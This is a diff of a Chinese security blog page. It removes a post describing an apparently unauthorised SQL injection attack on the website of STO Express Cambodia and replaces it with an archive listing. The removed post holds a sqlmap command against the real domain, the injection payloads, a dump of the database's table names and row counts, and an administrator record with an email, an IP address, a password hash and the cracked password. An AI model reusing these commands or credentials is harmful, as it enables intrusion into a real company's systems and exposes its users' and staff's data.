@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>对柬埔寨申通的实战渗透 | APT-C-61</title>
+  <title>archives: 2022/4 | APT-C-61</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -537,511 +537,106 @@
     
 </header>
         <!-- 内容区域 -->
-        
- <!-- prismjs 代码高亮 -->
- 
-
-
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
-
-
-  <!-- 文章详情页顶部图片和标题 -->
-
-
-
-
-<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('/medias/9.jpg')">
-  <div class="post-detail-header-mask"></div>
-  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+        <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
+<div class="bg-light-floor-archive" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
+<div class="archive-header" style="background-image:url('https://pic1.zhimg.com/80/v2-1414b3a4b205e19060db18a20d08723a_1440w.jpg?source=1940ef5c')">
+  <div class="archive-header-title">
+    archive
+  </div>
+  <div class="archive-header-desc">
   
-  <div class="post-detail-header_info-box">
-    <div class="title-box">
-      <span class="title">
-        对柬埔寨申通的实战渗透
-      </span>
-    </div>
-    
-    
-      
-        <span class="post-detail-header_date">
-          <i class="fas fa-calendar"></i> Published in：2022-03-31 |
-        </span>
-      
-
-      
-        <span class="post-detail-header_categories">
-          <i class="iconfont iconbookmark1"></i> category：
-          
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-detail-header_category">
-              渗透测试
-            </a>
-          
-        </span>
-      
-
-      
-    
-  </div>
-  
-  
-    <script src="/js/bubble/bubble.js"></script>
-  
-</div>
-
-
-
-
-
-<div class="row justify-position" 
-  style="padding-top: 0px;">
-  <div class="main-content">
-    <article class="post post-detail">
-      <div class="post-content">
-        <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u &quot;http://www.stocambodia.com/search.php?act=detail&amp;bglxid=972%E9%8E%88%27%22%5C%28&amp;cc=4111111111111111%2C&amp;city=&amp;country=NSW%E6%96%B0%E5%8D%97%E5%A8%81%E5%B0%94%E5%A3%AB%E5%B7%9E&amp;czcc=1&amp;gg=1%2C&amp;js=1%2C&amp;kk=1%2C&amp;weight=1%2C&amp;youbian=&quot; <span class="operator">-</span>p bglxid <span class="operator">-</span>D shentong <span class="comment">--tables --batch</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.55.20.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.55.20.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="截屏2022-03-31 21.55.20"></p>
-<h2 id="渗透测试第一部：数据暴库"><a href="#渗透测试第一部：数据暴库" class="headerlink" title="渗透测试第一部：数据暴库"></a>渗透测试第一部：数据暴库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="title function_ invoke__">bglxid</span> (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL OR error-based - WHERE <span class="keyword">or</span> HAVING <span class="title function_ invoke__">clause</span> (FLOOR)</span><br><span class="line">    Payload: act=detail&amp;bglxid=-<span class="number">7745</span> OR <span class="number">1</span> GROUP BY <span class="title function_ invoke__">CONCAT</span>(<span class="number">0x716a707671</span>,(<span class="title function_ invoke__">SELECT</span> (CASE <span class="title function_ invoke__">WHEN</span> (<span class="number">4657</span>=<span class="number">4657</span>) THEN <span class="number">1</span> ELSE <span class="number">0</span> END)),<span class="number">0x71626a7671</span>,<span class="title function_ invoke__">FLOOR</span>(<span class="title function_ invoke__">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>)) HAVING <span class="title function_ invoke__">MIN</span>(<span class="number">0</span>)<span class="comment">#&amp;cc=4111111111111111,&amp;city=&amp;country=NSW%E6%96%B0%E5%8D%97%E5%A8%81%E5%B0%94%E5%A3%AB%E5%B7%9E&amp;czcc=1&amp;gg=1,&amp;js=1,&amp;kk=1,&amp;weight=1,&amp;youbian=</span></span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= <span class="number">5.0</span>.<span class="number">12</span> time-based blind - Parameter <span class="title function_ invoke__">replace</span> (substraction)</span><br><span class="line">    Payload: act=detail&amp;bglxid=(SELECT <span class="number">7733</span> <span class="title function_ invoke__">FROM</span> (<span class="title function_ invoke__">SELECT</span>(<span class="title function_ invoke__">SLEEP</span>(<span class="number">5</span>)))tfTu)&amp;cc=<span class="number">4111111111111111</span>,&amp;city=&amp;country=NSW%E6%<span class="number">96</span>%B0%E5%<span class="number">8</span>D%<span class="number">97</span>%E5%A8%<span class="number">81</span>%E5%B0%<span class="number">94</span>%E5%A3%AB%E5%B7%<span class="number">9</span>E&amp;czcc=<span class="number">1</span>&amp;gg=<span class="number">1</span>,&amp;js=<span class="number">1</span>,&amp;kk=<span class="number">1</span>,&amp;weight=<span class="number">1</span>,&amp;youbian=</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
-
-<h3 id="记录数据多的数据库："><a href="#记录数据多的数据库：" class="headerlink" title="记录数据多的数据库："></a>记录数据多的数据库：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Database: shentong</span><br><span class="line">+------------------------+---------+</span><br><span class="line">| Table                  | Entries |</span><br><span class="line">+------------------------+---------+</span><br><span class="line">| ecs_stats              | 354977  |</span><br><span class="line">| ecs_admin_log          | 273014  |</span><br><span class="line">| ecs_zzfw_list          | 186535  |</span><br><span class="line">| ecs_route              | 87329   |</span><br><span class="line">| ecs_pianyuan_xq        | 85356   |</span><br><span class="line">| ecs_order_income       | 37977   |</span><br><span class="line">| ecs_order_outcome      | 31605   |</span><br><span class="line">| ecs_bank_info          | 28552   |</span><br><span class="line">| ecs_sessions_data      | 17238   |</span><br><span class="line">| ecs_jifen_log_copy1    | 15496   |</span><br><span class="line">| ecs_keywords           | 8361    |</span><br><span class="line">| ecs_jifen_user_copy1   | 5374    |</span><br><span class="line">| ecs_jifen_user_copy    | 4882    |</span><br><span class="line">| ecs_wx_message         | 3814    |</span><br><span class="line">| ecs_cz_info            | 3612    |</span><br><span class="line">| ecs_region             | 3408    |</span><br><span class="line">| ecs_qywx_djr           | 3051    |</span><br><span class="line">| ecs_bank_zxcb          | 2798    |</span><br><span class="line">| ecs_users              | 2440    |</span><br><span class="line">| ecs_paisong_czsm       | 1713    |</span><br><span class="line">| ecs_pay_log            | 1561    |</span><br><span class="line">| ecs_area_copy          | 1397    |</span><br><span class="line">| ecs_area               | 1326    |</span><br><span class="line">| ecs_jiali              | 861     |</span><br><span class="line">| ecs_searchengine       | 832     |</span><br><span class="line">| ecs_huojia             | 750     |</span><br><span class="line">| ecs_user_address       | 553     |</span><br><span class="line">| ecs_reg_extend_info    | 442     |</span><br><span class="line">| ecs_post_num_jl        | 394     |</span><br><span class="line">| ecs_order_action       | 336     |</span><br><span class="line">| ecs_vip_bglx           | 335     |</span><br><span class="line">| ecs_types              | 301     |</span><br><span class="line">| ecs_admin_action       | 286     |</span><br><span class="line">| ecs_order_zhichu       | 252     |</span><br><span class="line">| ecs_shop_config        | 239     |</span><br><span class="line">| ecs_goods_gallery      | 217     |</span><br><span class="line">| ecs_account_log        | 213     |</span><br><span class="line">| ecs_shop_config_wap    | 191     |</span><br><span class="line">| ecs_ad                 | 157     |</span><br><span class="line">| ecs_price_gbj          | 135     |</span><br><span class="line">| ecs_fencheng_jilu_copy | 124     |</span><br><span class="line">| ecs_fq_copy            | 115     |</span><br><span class="line">| ecs_fq                 | 100     </span><br></pre></td></tr></table></figure>
-
-<h2 id="后台攻破："><a href="#后台攻破：" class="headerlink" title="后台攻破："></a>后台攻破：</h2><p><em>后台数据表：ecs_admin_user</em> </p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin1,&lt;blank&gt;,&lt;blank&gt;,<span class="number">1259</span>,<span class="number">525999955</span>@qq.com,<span class="number">0</span>,<span class="number">0</span>,&lt;blank&gt;,<span class="number">2331</span>,<span class="number">96.9</span><span class="number">.88</span><span class="number">.251</span>,<span class="number">1634947229</span>,&lt;blank&gt;,331b05b18d04030e9b900c00553d497a,NULL,&lt;blank&gt;,&lt;blank&gt;,<span class="number">0</span>,admin1,<span class="number">1635709960</span>,<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">admin1  sto123</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.58.56.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/Tengshe2021/Missererr@main/uPic/%E6%88%AA%E5%B1%8F2022-03-31%2021.58.56.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="截屏2022-03-31 21.58.56"></p>
-
-      </div>
-      <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F/" class="">
-              实战渗透
-            </a>
-          
-            <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" class="">
-              SQL注入
-            </a>
-          
-        </div>
-        
-      </div>
-      
-        <div class="copyright">
-  <ul class="post-copyright">
-    <li class="post-copyright-author">
-    <strong>author:  </strong>༺腾蛇༻</a>
-    </li>
-    <li class="post-copyright-link">
-    <strong>link:  </strong>
-    <a href="/2022/03/31/对柬埔寨申通的实战渗透/" target="_blank" title="对柬埔寨申通的实战渗透">http://example.com/2022/03/31/对柬埔寨申通的实战渗透/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>Copyright notice:   </strong>
-      All articles on this website, unless otherwise stated, adopt <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
-      reprint policy. If reproduced, please indicate source!
-    </li>
-  </ul>
-<div>
-      
-    </article>
-    <!-- 上一篇文章和下一篇文章 -->
-    
-      <!-- 文章详情页的上一页和下一页 -->
-<div class="post-nav">
-
-
-
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
-    </div>
-    <a href="/2022/04/02/%E5%AF%B9ftftx%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> Prev:
-        <div class="title-text">对ftftx的渗透测试</div>
-      </div>
-      
-      <!-- <div class="content">
-        目标：
-
-前台地址：FTFTX-全球数字货币交易所综合平台排行
-漏洞地址：
-SQL包情况：123456789101112
-      </div> -->
-    </a>
-  </div>
-
-
-
-  
-  <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/6.jpg" class="lazyload placeholder" data-srcset="/medias/6.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" src="" alt="">
-    </div>
-    <a href="/2022/03/31/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/" class="post-nav-link">
-      <div class="title">
-        Next: <i class="fas fa-angle-right"></i>
-        <div class="title-text">网络空间搜索引擎</div>
-      </div>
-      <!-- <div class="content">
-        鹰图平台：1https://hunter.qianxin.com/
-
-
-Soall平台：1https://soall.o
-      </div> -->
-    </a>
-  </div>
-
-</div>
-
-    
-    
-
-    <!-- 打赏 -->
-    
-      <div id="appDonate" class="post-donate">
-  <div id="donate_board" class="donate_bar center" ref="donate">
-    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
-  </div>
-  <transition name="fade">
-    <div 
-      class="donate-box-mask"
-      v-cloak 
-      v-show="visible"
-      @click="cancelDialogDrawer()"
-    >
-    </div>
-  </transition>
-  <transition name="bounce">
-    <div class="donate-box" v-cloak v-show="visible">
-      <div class="donate-box_close">
-        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
-      </div>
-      <div class="donate-box_title">
-        <h4>
-          你的赏识是我前进的动力
-        </h4>
-      </div>
-      <div class="donate-box_tab">
-        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
-          支付宝
-        </div>
-        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
-          微信
-        </div>
-      </div>
-      <div class="donate-box_img">
-        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="支付宝打赏" />
-        </div> 
-        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="微信打赏" />
-        </div>
-      </div>
-    </div>
-  </transition>
-</div>
-
-<script>
-  var body = document.body || document.documentElement || window;
-  var vm = new Vue({
-    el: '#appDonate',
-    data: {
-      visible: false,
-      tabActive: 'Alipay',
-      top: 0,
-    },
-    computed: {
-    },
-    mounted() {
-    },
-    methods: {
-      showDialogDrawer() {
-        this.visible = true;
-        // 防止页面滚动，只能让弹框滚动
-        // function getScroll() {
-        //   return {
-        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
-        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
-        //   };
-        // }
-        this.top = $(document).scrollTop() // or getScroll().top
-        // console.log('aa', $('.main-content'));
-        body.style.cssText = 'overflow: hidden;';
-      },
-      cancelDialogDrawer() {
-        this.visible = false;
-        body.removeAttribute('style');
-        $(document).scrollTop(this.top)
-      },
-      changeTabActive(name) {
-        this.tabActive = name;
-      }
-    },
-    created() {}
-  })
-</script>
-    
-
-    <!-- 分享 -->
-    
-      <!-- https://github.com/overtrue/share.js -->
-<!-- 文章详情页的分享 -->
-<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-
-<script src="/js/shareJs/social-share.min.js"></script>
-</script>
-
-<style>
-  .social-share {
-    margin: 20px 0;
-  }
-</style>
-
-
-    
-    
-    <!-- 评论 -->
-    <!-- 评论 -->
-
-  <div id="myComment">
-    
-      <div id="gitment-container"></div>
-
-    
-  </div>
-
-<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
-
-
-  </div>
-
-  <!-- 目录 -->
-  <!-- 文章详情页右侧目录 -->
-
-  <div class="toc-aside">
-    <div class="toc-main">
-      <div class="toc-aside-title">
-        <i class="fas fa-list-ul" aria-hidden="true"></i><span>catalog</span>
-        
-          <div class="toc-open-close">catalog</div>
-        
-      </div>
-      <div class="toc-content">
-        <div class="toc"></div>
-      </div>
-    </div>
-  </div>
-
-  <!-- 手机端目录按钮 -->
-  <div id="toc-mobile-btn">
-    <i class="fas fa-list-ul" aria-hidden="true"></i>
-  </div>
-
-
-<script>
-  function closeToc(init) {
-    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
-    $(".toc-content").css({'width': 0});
-    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
-    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
-  };
-  function openToc() {
-    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
-    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
-    $(".toc-content").css({'width': '300px'});
-    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
-  }
-  function openBtnClickFn () {
-    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
-    let open = eval('' || 'true');
-    openOrCloseBtn.click(function() {
-      if (open) {
-        closeToc();
-        open = false;
-      } else {
-        openToc();
-        open = true;
-      }
-    });
-  };
-  openBtnClickFn();
-  initCloseTocWidth(true);
-
-  function initCloseTocWidth(init) {
-    if (window.innerWidth >= 992) {
-      let isClose = false;
-      isClose && closeToc(init)
-    }
-  }
-
-  document.addEventListener('pjax:complete', function () {
-    $(".toc-aside").css({'transition': 'no'});
-  })
-  document.addEventListener('pjax:complete', function () {
-    openBtnClickFn();
-  })
-  
-</script>
-
-  <!-- 图片放大 Wrap images with fancybox support -->
-  <script src="/js/wrapImage.js"></script>
-</div>
-
-<!-- 文章详情页背景图 -->
-<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
-	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
-	<transition-group tag="ul" :name="names">
-		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
-			<img :src="image" class="bg-swiper-img no-lazy">
-		</li>
-	</transition-group>
-</div>
-<script>
-	var vm = new Vue({
-		el: '#appBgSwiper',
-		data: {
-			names: '' || 'fade' || 'fade', // translate-fade fade
-			mark: 0,
-			img: [],
-			bgColor: '',
-			time: null
-		},
-		methods: {   //添加方法
-			change(i, m) {
-				if (i > m) {
-					// this.names = 'fade';
-				} else if (i < m) {
-					// this.names = 'fade';
-				} else {
-					return;
-				}
-				this.mark = i;
-			},
-			prev() {
-				// this.names = 'fade';
-				this.mark--;
-				if (this.mark === -1) {
-					this.mark = 3;
-					return
-				}
-			},
-			next() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			autoPlay() {
-				// this.names = 'fade';
-				this.mark++;
-				if (this.mark === this.img.length) {
-					this.mark = 0;
-					return
-				}
-			},
-			play() {
-				let bgImgDelay = '' || '180000'
-				let delay = parseInt(bgImgDelay) || 180000;
-				this.time = setInterval(this.autoPlay, delay);
-			},
-			enter() {
-				clearInterval(this.time);
-			},
-			leave() {
-				this.play();
-			}
-		},
-		created() {
-			this.play()
-		},
-		beforeDestroy() {
-			clearInterval(this.time);
-		},
-		mounted() {
-			let prop = '' || '';
-			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
-			if (isImg) {
-				let img = prop.split(',');
-				let configRoot = '/'
-				let arrImg = [];
-				img.forEach(el => {
-					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
-					var objExp = new RegExp(Expression);
-
-					if (objExp.test(el)) {
-						// http or https
-						arrImg.push(el);
-					} else {
-						// 非http or https开头
-						// 本地文件
-						let firstStr = el.charAt(0);
-						if (firstStr == '/') {
-							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
-						}
-						el = configRoot + el;
-						arrImg.push(el);
-					}
-				})
-				this.img = arrImg;
-			} else {
-				this.bgColor = prop;
-			}
-		}
-	})
-</script>
-
-<style>
-	.bg-swiper-box {
-		position: absolute;
-		display: block;
-		width: 100%;
-		height: 100%;
-	}
-
-	.bg-swiper-img {
-		object-fit: cover;
-		width: 100%;
-		height: 100%;
-	}
-</style>
-
-
-
-
+  <span class="title" id="archive-header-desc"></span>
   <script>
-  function loadMermaid() {
-    if (document.getElementsByClassName('mermaid').length) {
-      if (window.mermaidJsLoad) mermaid.init()
-      else {
-        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
-          window.mermaidJsLoad = true
-          mermaid.initialize({
-            theme: 'default',
-          })
-          if ('true') {
-            mermaid.init();
-          }
-        })
-      }
-    }
-  };
-  document.addEventListener("DOMContentLoaded", function () {
-    loadMermaid();
-  })
-
-  document.addEventListener('pjax:complete', function () {
-    loadMermaid();
-  })
-  
+  function typedFn() {
+    const el = '#archive-header-desc';
+    const type = 'archive';
+    let desc = '人才进行工作，而天才则进行创造'
+    var typed = new Typed(el, {
+      strings: [desc],
+      startDelay: 100,
+      typeSpeed: 100,
+      loop: true,
+      backSpeed: 50,
+      showCursor: true
+    });
+  }
+  typedFn();
 </script>
+  
+  </div>
+  <div class="mask-box"></div>
+</div>
 
+<div class="archive-video">
+  <video class="full-video" autoplay loop muted>
+      <source style="width: 100%;height: 100vh;" src="/">
+  </video>
+  <div class="video-header-title">
+    archive
+  </div>
+  <div class="video-header-desc">
+  
+      <span class="title" id="archive-video-header-desc"></span>
+      <script>
+  function typedFn() {
+    const el = '#archive-video-header-desc';
+    const type = 'archive';
+    let desc = '人才进行工作，而天才则进行创造'
+    var typed = new Typed(el, {
+      strings: [desc],
+      startDelay: 100,
+      typeSpeed: 100,
+      loop: true,
+      backSpeed: 50,
+      showCursor: true
+    });
+  }
+  typedFn();
+</script>
+      
+  </div>
+  <div class="mask-box"></div>
+</div>
+
+<!-- hash算法 -->
+
+
+<div class="archive-main">
+  <section class="archive">
+    <div class="archive-content">
+      <ul class="post-archive">
+        
+        
+          
+            
+            <div class="year" data-aos="zoom-in-up">
+                <div class="bullet"></div>
+                <a href="/archives/2022">2022</a>
+            </div>
+          
+          <li class="post-item" data-aos="fade-left">
+            
+            <div class="post-img-box">
+              <a href="/2022/04/02/%E5%AF%B9ftftx%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-img " style="background-size: cover; 
+                background-position: center center;">
+                <img class="lazyload lazyload placeholder" src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg" alt="">
+              </a>
+            </div>
+            <div class="post-date-title">
+              <div>
+                <span class="post-date">04-02</span>
+              </div>
+              <a class="post-title" href="/2022/04/02/%E5%AF%B9ftftx%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对ftftx的渗透测试</a>
+            </div>
+          </li>
+        
+      </ul>
+    </div>
+  </section>
+  <div class="w-70">
+    
+  </div>
+</div>
 
       </main>
     </div>
